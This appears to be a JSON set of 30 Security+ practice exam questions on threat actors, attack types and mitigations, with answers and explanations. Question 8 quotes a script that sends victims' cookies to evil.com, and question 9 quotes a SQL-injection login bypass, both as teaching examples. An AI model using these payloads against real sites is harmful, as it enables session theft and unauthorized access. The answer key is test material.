@@ -1,0 +1,392 @@
+[
+  {
+    "id": "t2q1",
+    "objective": "QUESTION 1 OF 30 · Objective 2.1",
+    "question": "A threat actor group infiltrated a defense contractor's network and maintained persistent access for 14 months while exfiltrating classified weapons design documents. The group used custom malware and exploited multiple zero-day vulnerabilities. Which threat actor type BEST describes this group?",
+    "options": {
+      "A": "Organized crime",
+      "B": "Nation-state",
+      "C": "Hacktivist",
+      "D": "Insider threat"
+    },
+    "correct": "B",
+    "explanation": "The defining characteristics here are: custom malware (not off-the-shelf tools), multiple zero-day exploits (extremely expensive and rare), 14-month dwell time (APT-style patience), and espionage motivation (classified weapons designs). This is the textbook definition of a nation-state APT (Advanced Persistent Threat). Organized crime (A) focuses on financial gain — ransomware, card fraud — not weapons espionage. Hacktivists (C) announce their attacks publicly and use DDoS/defacement. Insider threats (D) are internal to the organization. Only nation-states have the resources, motivation, and capability described here."
+  },
+  {
+    "id": "t2q2",
+    "objective": "QUESTION 2 OF 30 · Objective 2.1",
+    "question": "An employee in the marketing department installs Dropbox on their work laptop to easily share files with external clients, without going through the IT approval process. This is BEST classified as:",
+    "options": {
+      "A": "Insider threat",
+      "B": "Data exfiltration",
+      "C": "Hacktivist behavior",
+      "D": "Shadow IT"
+    },
+    "correct": "D",
+    "explanation": "Shadow IT is specifically defined as the use of unauthorized IT systems or applications within an organization — often for convenience — without IT department approval or oversight. The employee is not being malicious (no intent to harm), so this is not an insider threat in the malicious sense. Data exfiltration implies deliberate data theft with malicious intent. The key distinguisher: Shadow IT is about using UNAPPROVED tools for LEGITIMATE productivity purposes, bypassing IT governance. The security risk is real (no DLP, no visibility, potential data stored in unmanaged cloud) but the intent is innocent."
+  },
+  {
+    "id": "t2q3",
+    "objective": "QUESTION 3 OF 30 · Objective 2.1",
+    "question": "A group of hackers takes down a pharmaceutical company's website for 48 hours and releases internal emails showing price-gouging practices. The group announces \"We are doing this for the people who can't afford medicine.\" What is the PRIMARY motivation of this threat actor?",
+    "options": {
+      "A": "Financial gain",
+      "B": "Philosophical/political beliefs",
+      "C": "Espionage",
+      "D": "Blackmail"
+    },
+    "correct": "B",
+    "explanation": "The attacker explicitly states their motivation: concern about medicine affordability — a social/political cause. This is the hallmark of a hacktivist group (similar to Anonymous). The tactics — DDoS to disrupt service + data leak to expose wrongdoing — are classic hacktivist methods used to publicize a cause. Financial gain (A) would involve demanding money. Espionage (C) would involve quietly extracting information without revealing it publicly. Blackmail (D) would involve threatening to release data unless a demand is met. Publicly releasing the data to expose injustice = philosophical/political motivation."
+  },
+  {
+    "id": "t2q4",
+    "objective": "QUESTION 4 OF 30 · Objective 2.2",
+    "question": "An attacker registers the domain \"micros0ft.com\" (with zero instead of letter o) and creates a convincing Microsoft login page. Users who mistype the URL are directed to this page where their credentials are captured. What technique is this?",
+    "options": {
+      "A": "Vishing",
+      "B": "Brand impersonation",
+      "C": "Typosquatting",
+      "D": "Watering hole"
+    },
+    "correct": "C",
+    "explanation": "Typosquatting (also called URL hijacking) involves registering domain names that are slight misspellings or variations of legitimate domains, specifically to capture users who make typing errors. \"micros0ft.com\" with a zero replacing the letter 'o' is a classic typosquatting example. Brand impersonation (B) is a broader term that includes copying logos and creating fake pages — typosquatting is a specific technique within brand impersonation, but when the question specifically mentions a misspelled domain, typosquatting is the most precise answer. Watering hole (D) involves compromising a legitimate site already visited by targets. Vishing (A) uses voice calls."
+  },
+  {
+    "id": "t2q5",
+    "objective": "QUESTION 5 OF 30 · Objective 2.2",
+    "question": "An attacker calls a bank employee and says: \"Hi, this is David from IT support. We've detected suspicious activity on your account. I need you to verify your system password so I can lock out the attacker.\" What social engineering technique is primarily being used?",
+    "options": {
+      "A": "Phishing",
+      "B": "Smishing",
+      "C": "Pretexting with vishing",
+      "D": "Impersonation only"
+    },
+    "correct": "C",
+    "explanation": "This scenario uses TWO techniques: (1) Vishing — the attack is conducted via voice call. (2) Pretexting — the attacker creates a fabricated SCENARIO (\"suspicious activity detected,\" \"I'm from IT support\") to make the request seem legitimate. Pretexting is specifically the creation of a false context/story (the pretext) that gives the attacker credibility to make an unusual request. Phishing (A) is email-based. Smishing (B) is SMS-based. Simple impersonation (D) is pretending to be someone — but pretexting adds the fabricated scenario around the impersonation. The exam often tests the difference between impersonation alone and impersonation WITH a fabricated story (pretexting)."
+  },
+  {
+    "id": "t2q6",
+    "objective": "QUESTION 6 OF 30 · Objective 2.2",
+    "question": "Employees of a cybersecurity company frequently visit a niche industry forum for threat intelligence. An attacker compromises that forum website and injects malware that silently installs on visitors' machines. What attack type is this?",
+    "options": {
+      "A": "Spear phishing",
+      "B": "Watering hole attack",
+      "C": "Typosquatting",
+      "D": "Drive-by download"
+    },
+    "correct": "B",
+    "explanation": "A watering hole attack compromises a website that the TARGET AUDIENCE is known to visit regularly — analogous to predators waiting at a watering hole for prey. The key elements: attacker researched which site the targets (cybersecurity employees) frequent, compromised THAT specific site, and infected visitors. Spear phishing (A) is a targeted email attack. Typosquatting (C) involves misspelled domain names. Drive-by download (D) is a generic term for malware that downloads when visiting a site — but the SPECIFIC attack pattern of targeting a site because your targets visit it is called a watering hole attack. Drive-by download describes the delivery mechanism; watering hole describes the strategy."
+  },
+  {
+    "id": "t2q7",
+    "objective": "QUESTION 7 OF 30 · Objective 2.2",
+    "question": "A security team discovers an attacker inserted malicious code into an update package distributed by a major enterprise software vendor. 800 of the vendor's clients unknowingly installed the compromised update. This is BEST described as:",
+    "options": {
+      "A": "Supply chain attack",
+      "B": "Watering hole attack",
+      "C": "Malicious insider attack",
+      "D": "Zero-day exploit"
+    },
+    "correct": "A",
+    "explanation": "A supply chain attack targets a vendor or supplier that provides products/services to the actual targets. By compromising the vendor's update package, the attacker reaches hundreds of organizations who trust that vendor — far more efficient than attacking each individually. This is the exact pattern of the SolarWinds attack (2020). Watering hole (B) involves compromising a website targets visit — not a software update package. Malicious insider (C) implies the attacker is an employee of the victim organization — here the breach is at the vendor level. Zero-day (D) could be used in the attack but isn't what defines this attack — the defining characteristic is exploitation of the supply chain trust relationship."
+  },
+  {
+    "id": "t2q8",
+    "objective": "QUESTION 8 OF 30 · Objective 2.3",
+    "question": "A web application allows users to submit comments. An attacker submits the following as a comment: &lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;. When other users view the page, their session cookies are sent to the attacker's server. What vulnerability is being exploited?",
+    "options": {
+      "A": "SQL Injection",
+      "B": "Buffer overflow",
+      "C": "Cross-site scripting (XSS)",
+      "D": "Directory traversal"
+    },
+    "correct": "C",
+    "explanation": "XSS occurs when an attacker injects malicious client-side scripts (JavaScript) into web pages viewed by other users. The website stores the script (stored/persistent XSS) and when victims load the page, their browsers execute it — in this case stealing session cookies. The script runs in the VICTIM'S browser, not on the server. SQL injection (A) targets the database server with malicious SQL code — the injected content here is JavaScript, not SQL. Buffer overflow (B) is a memory management attack in applications, not a web scripting issue. Directory traversal (D) involves manipulating file paths to access restricted files. The presence of &lt;script&gt; tags in user input that the server reflects back = XSS."
+  },
+  {
+    "id": "t2q9",
+    "objective": "QUESTION 9 OF 30 · Objective 2.3",
+    "question": "A login form accepts the following input in the username field: ' OR 1=1 --. This causes the application to return all user records and log in as the first user (admin). What mitigation would have BEST prevented this?",
+    "options": {
+      "A": "Output encoding",
+      "B": "Parameterized queries (prepared statements)",
+      "C": "Content Security Policy",
+      "D": "Stack canaries"
+    },
+    "correct": "B",
+    "explanation": "SQL injection is prevented by ensuring user input is NEVER treated as SQL code. Parameterized queries (prepared statements) separate the SQL code from the data — the query structure is defined first, then data values are passed separately. The database knows the user's input is a string literal, not code, so ' OR 1=1 -- is treated as a username string, not executable SQL. Output encoding (A) prevents XSS by encoding characters in HTML output — not relevant for database queries. Content Security Policy (C) is an XSS mitigation. Stack canaries (D) prevent buffer overflow attacks. Parameterized queries are THE standard mitigation for SQLi — if you remember nothing else about SQLi, remember this."
+  },
+  {
+    "id": "t2q10",
+    "objective": "QUESTION 10 OF 30 · Objective 2.3",
+    "question": "A malicious process running inside a virtual machine exploits a vulnerability in the hypervisor software and gains the ability to execute code on the host operating system, accessing other virtual machines on the same physical server. What vulnerability was exploited?",
+    "options": {
+      "A": "VM escape",
+      "B": "Resource reuse",
+      "C": "Side-channel attack",
+      "D": "Privilege escalation"
+    },
+    "correct": "A",
+    "explanation": "VM escape is specifically the attack where a process inside a VM breaks out of the virtualized environment to interact with the hypervisor or host OS — exactly what's described. The key: the attacker CROSSED THE BOUNDARY between the guest VM and the host, which should be a strict security boundary. Resource reuse (B) involves data leaking between VMs through improperly shared resources — data leaks, not code execution on the host. While privilege escalation (D) may be involved in the process, the specific vulnerability type being tested is VM escape — the crossing of the hypervisor boundary. Side-channel (C) attacks exploit indirect information (timing, power consumption) — not described here."
+  },
+  {
+    "id": "t2q11",
+    "objective": "QUESTION 11 OF 30 · Objective 2.3",
+    "question": "A developer's application checks whether a file exists (Time of Check), and then opens it (Time of Use). An attacker replaces the file with a malicious version between these two operations. What type of vulnerability is this?",
+    "options": {
+      "A": "Buffer overflow",
+      "B": "Memory injection",
+      "C": "Race condition (TOC/TOU)",
+      "D": "Malicious update"
+    },
+    "correct": "C",
+    "explanation": "This is the textbook TOC/TOU (Time of Check/Time of Use) race condition. The vulnerability exists in the GAP between when a condition is verified (TOC: file exists check) and when the resource is used (TOU: file is opened). An attacker exploits this window to change the resource so it's different when used than when checked. The question explicitly uses the TOC/TOU terminology, making this unambiguous. Buffer overflow (A) involves memory boundary violations. Memory injection (B) involves inserting code into a process's memory. Malicious update (D) involves compromising a software update pipeline. The two-step check-then-use with an exploitable gap in between = race condition."
+  },
+  {
+    "id": "t2q12",
+    "objective": "QUESTION 12 OF 30 · Objective 2.3",
+    "question": "A user downloads an app from an unofficial third-party website onto their Android phone, bypassing the Google Play Store. The app contains spyware that captures banking credentials. What vulnerability category enabled this attack?",
+    "options": {
+      "A": "Sideloading",
+      "B": "Jailbreaking",
+      "C": "Firmware vulnerability",
+      "D": "Zero-day exploit"
+    },
+    "correct": "A",
+    "explanation": "Sideloading is installing applications from OUTSIDE the official app store, bypassing the security review process. On Android, users can enable \"Unknown sources\" to allow this. The app store's review process catches most malware — sideloaded apps skip this check entirely. This is distinct from jailbreaking (B), which involves removing OS-level restrictions and requires technical exploitation of the OS itself — you don't need to jailbreak to sideload on Android, you just enable a setting. Jailbreaking is more relevant on iOS where the OS normally prevents any installation outside the App Store. The scenario describes Android, unofficial website download, no OS modification described = sideloading."
+  },
+  {
+    "id": "t2q13",
+    "objective": "QUESTION 13 OF 30 · Objective 2.4",
+    "question": "A security analyst reviewing authentication logs sees that the account \"jsmith\" has had exactly 2 failed login attempts — but this exact pattern appears across 450 user accounts over the past hour. What type of attack is MOST likely occurring?",
+    "options": {
+      "A": "Brute force attack against jsmith specifically",
+      "B": "Credential stuffing",
+      "C": "Password spraying",
+      "D": "Keylogger exfiltration"
+    },
+    "correct": "C",
+    "explanation": "Password spraying is characterized by: FEW attempts per account (here: 2) across MANY accounts (here: 450). The attacker tries a small set of commonly used passwords (Password1!, Welcome1, Company2024!) against every account without triggering lockout policies. This is designed specifically to avoid account lockout by staying below the threshold. Brute force (A) would involve hundreds or thousands of attempts against a SINGLE account, triggering lockout. Credential stuffing (B) uses username/password pairs from previously breached databases — the pattern would show one or zero attempts per account. Keylogger (D) would capture credentials directly, not generate failed login attempts. Low-per-account + many accounts = spraying."
+  },
+  {
+    "id": "t2q14",
+    "objective": "QUESTION 14 OF 30 · Objective 2.4",
+    "question": "Security monitoring shows that a VPN account successfully authenticated from New York at 9:03 AM. At 9:11 AM, the same account successfully authenticated from Tokyo. The security team should FIRST:",
+    "options": {
+      "A": "Reset the user's password and wait for them to contact the helpdesk",
+      "B": "Immediately terminate both sessions and investigate the compromised credentials",
+      "C": "Send an email to the user asking if they're traveling",
+      "D": "Add the Tokyo IP to the deny list"
+    },
+    "correct": "B",
+    "explanation": "This is a clear impossible travel indicator — New York to Tokyo in 8 minutes is physically impossible. This strongly indicates credential theft and active unauthorized access. The immediate response is to terminate BOTH sessions (one is the legitimate user, one is the attacker — you don't know which is which) and begin investigation. Simply resetting the password (A) without terminating sessions leaves the active attacker connected. Emailing the user (C) is too slow and alerts the attacker if they've compromised email too. Blocking just the Tokyo IP (D) is insufficient — the attacker may use a different IP. The impossible travel indicator requires immediate session termination as the first action, followed by investigation and credential remediation."
+  },
+  {
+    "id": "t2q15",
+    "objective": "QUESTION 15 OF 30 · Objective 2.4",
+    "question": "After a security incident investigation, a forensics team finds that logs from the critical file server are completely absent for a 4-hour window during the suspected attack timeframe. All other servers have logs for that period. What does this MOST likely indicate?",
+    "options": {
+      "A": "The file server was offline for maintenance",
+      "B": "A logging misconfiguration that existed before the attack",
+      "C": "Storage capacity issues caused log rotation to overwrite entries",
+      "D": "Attacker tampered with or deleted logs to cover their tracks"
+    },
+    "correct": "D",
+    "explanation": "Missing logs are a named Security+ indicator of malicious activity (specifically listed in objective 2.4). When logs are missing from ONLY the targeted system, during the EXACT timeframe of the suspected attack, this strongly indicates deliberate log tampering or deletion to cover evidence of the attack. All other servers have logs for that period — ruling out a systemic logging failure. Maintenance (A) would typically appear in change management records and wouldn't explain why only that server's logs are missing. Pre-existing misconfiguration (B) would show missing logs before the attack timeframe too. Storage rotation (C) would typically affect the oldest logs, not a specific 4-hour window. Log gaps during incident timeframes = attacker anti-forensics."
+  },
+  {
+    "id": "t2q16",
+    "objective": "QUESTION 16 OF 30 · Objective 2.4",
+    "question": "Users report they can access a website normally, but they're seeing strange certificate warnings even on sites they visit daily. An analyst captures traffic and sees it's being redirected through an unknown proxy. What attack is occurring?",
+    "options": {
+      "A": "DDoS reflected attack",
+      "B": "DNS attack",
+      "C": "On-path (man-in-the-middle) attack",
+      "D": "Credential replay"
+    },
+    "correct": "C",
+    "explanation": "An on-path attack (formerly called man-in-the-middle) intercepts communication between two parties — placing the attacker's system between the user and the server. The classic indicators are: (1) Certificate warnings — the attacker presents their own certificate instead of the server's, causing the browser to warn about an untrusted certificate. (2) Traffic routed through unknown proxy — the attacker's system is the intermediary. Users can still access sites because the attacker forwards their requests and responses, but the attacker can read and modify all traffic. DDoS (A) would prevent access. DNS attack (B) would redirect to a completely different IP, not proxy traffic. Credential replay (D) reuses captured credentials, not intercept active sessions."
+  },
+  {
+    "id": "t2q17",
+    "objective": "QUESTION 17 OF 30 · Objective 2.4",
+    "question": "A system administrator notices that a process on a production server is consuming 95% of the CPU and making frequent outbound connections to cryptocurrency mining pools. No authorized mining software is installed. What type of attack is this?",
+    "options": {
+      "A": "Ransomware",
+      "B": "Cryptojacking (malicious crypto-mining)",
+      "C": "Worm spreading",
+      "D": "Keylogger"
+    },
+    "correct": "B",
+    "explanation": "Cryptojacking uses unauthorized computing resources to mine cryptocurrency for the attacker. The indicators here are textbook: excessive CPU consumption (mining is CPU/GPU intensive), outbound connections to mining pools (where the mined currency is sent to the attacker). The attacker profits from your electricity and hardware while you see performance degradation. Ransomware (A) would encrypt files, not consume CPU for mining. Worms (C) cause high NETWORK traffic (replication/spreading) — the key indicator here is CPU consumption and mining pool connections. Keyloggers (D) run quietly with minimal resource footprint and would cause unusual outbound traffic with captured keystrokes, not mining pool connections. High CPU + mining pool connections = cryptojacking."
+  },
+  {
+    "id": "t2q18",
+    "objective": "QUESTION 18 OF 30 · Objective 2.4",
+    "question": "An attacker captures a valid Kerberos ticket from a user's workstation and uses it to authenticate to multiple servers over the next 8 hours. Which attack type is this?",
+    "options": {
+      "A": "Brute force",
+      "B": "Birthday attack",
+      "C": "Credential replay",
+      "D": "Downgrade attack"
+    },
+    "correct": "C",
+    "explanation": "Credential replay (also called pass-the-ticket in Kerberos environments) involves capturing a valid authentication credential (ticket, token, hash) and replaying it to authenticate without knowing the original password. The attacker captured the Kerberos ticket, then REUSED it to access servers — that's a replay. Brute force (A) tries many passwords to find the correct one — no brute force is happening here. Birthday attack (B) is a cryptographic attack finding hash collisions — not credential reuse. Downgrade (D) forces weaker protocols. Mitigation for replay attacks: timestamps on tokens (so old tokens are rejected), nonces (single-use values), short session expiry, Kerberos short ticket lifetimes."
+  },
+  {
+    "id": "t2q19",
+    "objective": "QUESTION 19 OF 30 · Objective 2.4",
+    "question": "A user reports that their antivirus keeps running scans but never detects any malware, even though their system is behaving strangely — files appear hidden, processes aren't showing up in Task Manager, and the system is sluggish. What type of malware is MOST likely present?",
+    "options": {
+      "A": "Ransomware",
+      "B": "Logic bomb",
+      "C": "Worm",
+      "D": "Rootkit"
+    },
+    "correct": "D",
+    "explanation": "A rootkit operates at the kernel level — it modifies the OS itself to hide its presence. This explains why: (1) Antivirus doesn't detect it — the rootkit intercepts antivirus scans and hides itself from them. (2) Files and processes are hidden — the rootkit patches OS functions that list files/processes to exclude its own. (3) Traditional detection tools fail. The name comes from \"root\" (highest privilege level) and \"kit\" (toolkit). Detection requires specialized tools that boot from clean media (offline scanning), not the compromised OS itself. Ransomware (A) would encrypt files — you'd know immediately. Logic bomb (B) is dormant until triggered, not causing ongoing issues. Worm (C) would primarily cause network traffic spikes."
+  },
+  {
+    "id": "t2q20",
+    "objective": "QUESTION 20 OF 30 · Objective 2.4",
+    "question": "Two different files — a legitimate software installer and a malware executable — produce the same SHA-1 hash value. What cryptographic attack has been exploited and what is the implication?",
+    "options": {
+      "A": "Downgrade attack; switch to SHA-2",
+      "B": "Collision attack; SHA-1 is compromised for integrity verification",
+      "C": "Birthday attack; salt must be added to SHA-1",
+      "D": "Brute force attack; SHA-1 key needs to be longer"
+    },
+    "correct": "B",
+    "explanation": "A collision attack finds two DIFFERENT inputs that produce the SAME hash output. SHA-1 has been shown to have practical collision vulnerabilities (Google's SHAttered attack in 2017 demonstrated a practical SHA-1 collision). The implication: if an attacker can create a malware file with the same SHA-1 hash as a legitimate installer, integrity verification based on SHA-1 would show \"hash matches = file is legitimate\" — even for the malware. This completely undermines hash-based integrity checking. The fix: switch to SHA-256 or SHA-3 which are much larger hash spaces. Birthday attacks (C) are related but specifically about the statistical probability aspect. Adding salt (C) is for password hashing, not file integrity. SHA-1 + two files + same hash = collision attack."
+  },
+  {
+    "id": "t2q21",
+    "objective": "QUESTION 21 OF 30 · Objective 2.5",
+    "question": "After a ransomware attack spreads across an organization's entire flat network, the CISO mandates that the network must be redesigned so that future attacks can only affect one department at a time. What mitigation technique addresses this requirement?",
+    "options": {
+      "A": "Network segmentation",
+      "B": "Application allow listing",
+      "C": "Decommissioning",
+      "D": "Configuration enforcement"
+    },
+    "correct": "A",
+    "explanation": "The CISO's requirement is to CONTAIN future attacks to a single department — this is precisely the purpose of network segmentation. A flat network allows lateral movement across the entire organization once a single machine is compromised. Segmentation (VLANs, firewalls between segments, microsegmentation) means a compromised machine in the Finance VLAN cannot reach HR or Engineering VLANs. Ransomware worms that spread across networks (like NotPetya) are contained by segmentation boundaries. Application allow listing (B) would prevent ransomware from executing but doesn't address network spread. Decommissioning (C) retires unused systems. Configuration enforcement (D) ensures secure settings. The keyword \"only affect one department\" = segmentation/containment."
+  },
+  {
+    "id": "t2q22",
+    "objective": "QUESTION 22 OF 30 · Objective 2.5",
+    "question": "A company implements a policy where only applications on a pre-approved list are allowed to execute on corporate workstations. Any other application is automatically blocked. What mitigation technique is this?",
+    "options": {
+      "A": "Deny listing",
+      "B": "Configuration enforcement",
+      "C": "Application allow listing",
+      "D": "Least privilege"
+    },
+    "correct": "C",
+    "explanation": "Application allow listing (formerly whitelisting) is the security control that permits ONLY pre-approved, known-good applications to execute. Default behavior is DENY — everything not explicitly approved is blocked. This is highly effective against malware because even brand-new, never-before-seen malware (including zero-days) cannot execute if it's not on the approved list. The contrast: deny listing (A) blocks known-bad applications and allows everything else — weaker because new malware isn't on the deny list yet. Configuration enforcement (B) ensures secure settings, not application control. Least privilege (D) controls what users CAN do within applications, not which applications can run. \"Only pre-approved list can run, everything else blocked\" = allow listing."
+  },
+  {
+    "id": "t2q23",
+    "objective": "QUESTION 23 OF 30 · Objective 2.5",
+    "question": "An organization discovers that an attacker moved laterally from a compromised HR workstation to the production database server because both were on the same network segment. What mitigation would MOST directly prevent this lateral movement?",
+    "options": {
+      "A": "Patching the HR workstation",
+      "B": "Encrypting the database",
+      "C": "Installing endpoint protection on all systems",
+      "D": "Network segmentation with access control between segments"
+    },
+    "correct": "D",
+    "explanation": "The specific problem is lateral movement between systems on the same network segment. The HR workstation should never be able to initiate connections to the production database server. Segmentation places them on different network segments with a firewall/ACL between them — the firewall enforces that HR workstations cannot reach database servers unless explicitly permitted. Patching (A) would prevent the initial compromise but doesn't stop lateral movement once the workstation is compromised. Encrypting the database (B) protects data if the database is breached but doesn't prevent an authenticated attacker from reaching it. Endpoint protection (C) might detect the lateral movement attempt but doesn't architecturally prevent it. Segmentation is the architectural solution that makes lateral movement require crossing a security boundary."
+  },
+  {
+    "id": "t2q24",
+    "objective": "QUESTION 24 OF 30 · Objective 2.5",
+    "question": "A security team is hardening all servers. Which action would MOST effectively reduce the attack surface by eliminating unnecessary communication channels that attackers could exploit?",
+    "options": {
+      "A": "Changing default administrator passwords",
+      "B": "Disabling unused ports and protocols (Telnet, FTP, SMBv1)",
+      "C": "Installing host-based firewalls",
+      "D": "Removing unnecessary software"
+    },
+    "correct": "B",
+    "explanation": "The question specifically asks about \"eliminating unnecessary communication channels.\" Open ports and enabled protocols ARE the communication channels. Disabling Telnet, FTP, SMBv1, and other unneeded protocols directly removes those attack vectors — an attacker cannot exploit a service that isn't running and a port that isn't open. Each open port is a potential entry point. Changing passwords (A) addresses authentication weaknesses but doesn't eliminate communication channels. Host-based firewalls (C) can block traffic to ports, but disabling the service entirely is more secure — a firewall can be misconfigured, but a disabled service can't be reached at all. Removing software (D) addresses applications, not network ports/protocols specifically. \"Communication channels\" → ports/protocols."
+  },
+  {
+    "id": "t2q25",
+    "objective": "QUESTION 25 OF 30 · Objective 2.5",
+    "question": "A database administrator has been granted full root access to every system in the organization to \"make their job easier.\" A security auditor flags this as a violation of which security principle?",
+    "options": {
+      "A": "Separation of duties",
+      "B": "Least privilege",
+      "C": "Defense in depth",
+      "D": "Zero trust"
+    },
+    "correct": "B",
+    "explanation": "Least privilege (also called principle of least privilege / PoLP) states that users, processes, and systems should have only the MINIMUM access necessary to perform their specific function. A DBA needs access to databases — not root access to every system. Granting excess access violates least privilege by giving far more permissions than required. The risk: if the DBA account is compromised, the attacker has root access everywhere. Separation of duties (A) prevents one person from having end-to-end control of a critical process (e.g., the person who approves payments shouldn't also make payments). Defense in depth (C) is the strategy of multiple layered security controls. Zero trust (D) is the architecture of \"never trust, always verify.\" The DBA root access issue is clearly least privilege."
+  },
+  {
+    "id": "t2q26",
+    "objective": "QUESTION 26 OF 30 · Objective 2.5",
+    "question": "A company is retiring a fleet of 200 laptops. The security team must ensure that sensitive customer data on these devices cannot be recovered. What decommissioning step is MOST appropriate for the hard drives?",
+    "options": {
+      "A": "Delete all files and format the drives before donation",
+      "B": "Move data to cloud storage then wipe drives once",
+      "C": "Use DoD-standard data wiping software or physically destroy the drives",
+      "D": "Remove the drives from laptops and store in a locked room"
+    },
+    "correct": "C",
+    "explanation": "Secure decommissioning requires ensuring data CANNOT be recovered. Simple deletion (A) only removes file system pointers — data is still on the disk and easily recoverable with forensic tools. Moving to cloud and single-wipe (B) is insufficient — one pass may not be enough for modern drives and doesn't address cloud security. Storing drives (D) just delays the problem. Proper decommissioning options: (1) Cryptographic erasure — if the drive is encrypted, delete the encryption key (data becomes unreadable). (2) DoD-standard overwriting (multiple passes of random data). (3) Physical destruction — shredding, degaussing, incineration — the most certain method. For drives with highly sensitive data (PII, customer data), physical destruction or certified wiping with verification is the standard."
+  },
+  {
+    "id": "t2q27",
+    "objective": "QUESTION 27 OF 30 · Objective 2.1 + 2.4",
+    "question": "SCENARIO: Three months after a disgruntled employee was terminated, the company discovers that all financial records for that quarter have been deleted from the database at exactly midnight on the employee's last day — the trigger being a specific date. What malware type is this, and who is the most likely threat actor?",
+    "options": {
+      "A": "Worm — Organized crime for financial gain",
+      "B": "Ransomware — Nation-state espionage",
+      "C": "Logic bomb — Insider threat (revenge motivation)",
+      "D": "Trojan — Script kiddie"
+    },
+    "correct": "C",
+    "explanation": "This scenario has three clear indicators pointing to one answer: (1) Logic bomb: malware that remains DORMANT until a specific trigger condition is met — in this case, a date/time trigger (\"midnight on last day\"). The deletion happened automatically based on a pre-set trigger. (2) Insider threat: the malware was planted by someone with legitimate access to the database, clearly before their termination — only an insider could have placed it. (3) Revenge motivation: the employee was disgruntled and terminated — classic revenge motivation for an insider threat. Logic bombs are specifically associated with insider threats as the planting mechanism. The 3-month gap between termination and execution demonstrates the dormancy aspect of a logic bomb perfectly."
+  },
+  {
+    "id": "t2q28",
+    "objective": "QUESTION 28 OF 30 · Objective 2.3 + 2.5",
+    "question": "A researcher discovers that a banking application uses a TLS 1.3 connection by default, but an attacker can force the connection to downgrade to TLS 1.1 by manipulating the initial handshake. What is this attack, and what is the BEST mitigation?",
+    "options": {
+      "A": "Collision attack; use SHA-3 hashing",
+      "B": "Downgrade attack; disable older TLS versions and enforce minimum TLS 1.2 or 1.3",
+      "C": "Replay attack; implement session nonces",
+      "D": "Birthday attack; use longer hash functions"
+    },
+    "correct": "B",
+    "explanation": "A downgrade attack forces a system to use a WEAKER protocol version than it supports. By manipulating the TLS handshake to make the server \"think\" the client only supports TLS 1.1, the attacker gets a connection using a weaker protocol with known exploitable vulnerabilities. The attacker can then exploit weaknesses in TLS 1.1 that don't exist in TLS 1.3. The mitigation: configure the server to refuse connections below TLS 1.2 — if TLS 1.1 is simply not supported, the downgrade is impossible. The attack works because the server is willing to fall back. Remove that willingness. POODLE was a real downgrade attack against SSL 3.0. Many modern security standards (PCI DSS, NIST) mandate TLS 1.2 minimum, with 1.3 preferred."
+  },
+  {
+    "id": "t2q29",
+    "objective": "QUESTION 29 OF 30 · Objective 2.2 + 2.5",
+    "question": "During a security assessment, a pen tester finds that 35 network cameras at a corporate facility still use the manufacturer's default username \"admin\" and password \"admin.\" What is the MOST efficient mitigation for this widespread issue?",
+    "options": {
+      "A": "Place cameras on a separate network segment",
+      "B": "Disable the cameras until credentials are changed",
+      "C": "Immediately change all default credentials and implement a configuration management process to enforce this for future deployments",
+      "D": "Apply firmware updates to all cameras"
+    },
+    "correct": "C",
+    "explanation": "The immediate action AND the systemic fix are both required for a complete answer. Immediately changing all 35 default credentials addresses the current vulnerability. Implementing a configuration management process (requiring default credential changes before deployment) prevents this from recurring. Option A (segmentation) is a good additional defense layer but doesn't fix the root cause — attackers on that segment can still access cameras with default creds. Option B (disabling) is too disruptive and temporary. Option D (firmware) is important for vulnerabilities but doesn't address the default credential problem — firmware updates won't change credentials. The two-part answer (fix now + process to prevent recurrence) is the most complete and correct response to a systemic misconfiguration finding."
+  },
+  {
+    "id": "t2q30",
+    "objective": "QUESTION 30 OF 30 · All 2.x Objectives",
+    "question": "COMPREHENSIVE SCENARIO: A financial services company suffers a breach. Investigation reveals: (1) An employee clicked a targeted email with their name and position included (2) The email contained a link that installed malware when clicked (3) The malware spread across all systems because no network separation existed (4) Attacker accessed financial records for 6 months before detection (5) No logs existed for the critical systems during the attack period.Match each finding to its correct security term:",
+    "options": {
+      "A": "(1)Phishing, (2)Trojan, (3)DDoS, (4)Zero-day, (5)Log rotation",
+      "B": "(1)Spear phishing, (2)Malware-laden file, (3)Flat network/no segmentation, (4)APT dwell time, (5)Missing logs/log tampering",
+      "C": "(1)Vishing, (2)Worm, (3)Resource reuse, (4)Insider threat, (5)Impossible travel",
+      "D": "(1)Smishing, (2)Ransomware, (3)VM escape, (4)Logic bomb, (5)Account lockout"
+    },
+    "correct": "B",
+    "explanation": "(1) Spear phishing: The email included the employee's name and position — this is personalized, targeted phishing = spear phishing. Generic phishing doesn't include personal details. (2) Malware-laden file/link: A link that installs malware when clicked = file-based or URL-based malware delivery. (3) Flat network / no segmentation: If malware could spread to ALL systems, there were no network segments to contain it. Proper segmentation would have limited spread. (4) APT dwell time: 6 months undetected is characteristic of an Advanced Persistent Threat — long-term, low-and-slow access. This is why insider threat detection and SIEM/anomaly detection matter. (5) Missing logs / log tampering: No logs for critical systems during the attack = attacker covered tracks by deleting logs. This is a named Security+ indicator of malicious activity."
+  }
+]
